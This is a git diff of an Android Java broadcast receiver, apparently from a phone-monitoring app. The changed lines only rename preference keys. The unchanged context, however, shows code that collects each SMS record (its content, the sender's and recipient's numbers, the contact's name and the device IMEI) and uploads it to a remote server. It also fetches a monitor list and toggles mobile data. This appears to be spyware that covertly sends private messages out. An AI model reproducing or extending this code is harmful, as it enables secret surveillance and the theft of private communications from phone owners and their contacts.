@@ -65,7 +65,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				if(tm==null){
 					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 				}
-				SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
+				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 				if(C.isBoot){
 					if(DirectiveUtil.toggelSIM(context, tm, directiveDB)){
 						   //执行换卡通知
@@ -82,7 +82,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				}).start();
 				
 				
-				String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE,""),C.RequestMethod.getMonitorList));
+				String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE_NUM,""),C.RequestMethod.getMonitorList));
 			    if(isCloseMobileNet){
 			    	AppUtil.toggleMobileNet(context, false);
 			    }
@@ -196,8 +196,8 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	}
 	
 	private void uploadSmsInfo(SMSRecordDB smsRecordDB,SMSRecord smsRecord,Context context) {
-		SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
-		String updateDate = "my_num="+sp.getString(C.PHONE,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(context)+"&you_name="+smsRecord.getName();
+		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		String updateDate = "my_num="+sp.getString(C.PHONE_NUM,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(context)+"&you_name="+smsRecord.getName();
 		String updateResult= AppUtil.streamToStr(NetworkUtil.upload(context,updateDate,C.RequestMethod.uploadSMS));
 		Logger.d("Cron", "返回结果："+updateResult);
 		if("ok".equalsIgnoreCase(updateResult)){
